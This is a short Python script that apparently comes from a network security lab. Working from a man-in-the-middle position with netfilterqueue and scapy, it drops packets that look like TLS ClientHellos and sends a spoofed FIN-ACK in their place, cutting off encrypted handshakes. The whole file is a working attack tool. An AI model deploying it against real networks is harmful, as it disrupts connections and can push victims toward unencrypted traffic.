from netfilterqueue import NetfilterQueue
from scapy.all import *
import json
import re
import requests

#print("MITM mode ON")

def create_fin_ack(from_pkt):
    return IP(
        src = '172.16.0.3',
        dst = from_pkt[IP].dst,
    )/TCP(
        sport = from_pkt[TCP].sport,
        dport = from_pkt[TCP].dport,
        seq = from_pkt[TCP].seq,
        ack = from_pkt[TCP].ack,
        flags = 'FA',
    )

def is_client_hello(tcp_payload):
    return tcp_payload[9] == 0x03 and \
        (tcp_payload[10] == 0x02 or tcp_payload[10] == 0x03)


def packetReceived(pkt):
    #print('.'*20 + 'packet arrived' + '.'*20)
    ip = IP(pkt.get_payload())
    if not ip.haslayer("Raw"):
        pkt.accept()
    else:
        tcp_payload = ip["Raw"].load
        if is_client_hello(tcp_payload):
            #print('Client Hello')
            pkt.drop()
            send(create_fin_ack(ip))
        else:
            pkt.accept()

nfqueue = NetfilterQueue()
nfqueue.bind(0, packetReceived)

try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')

nfqueue.unbind()
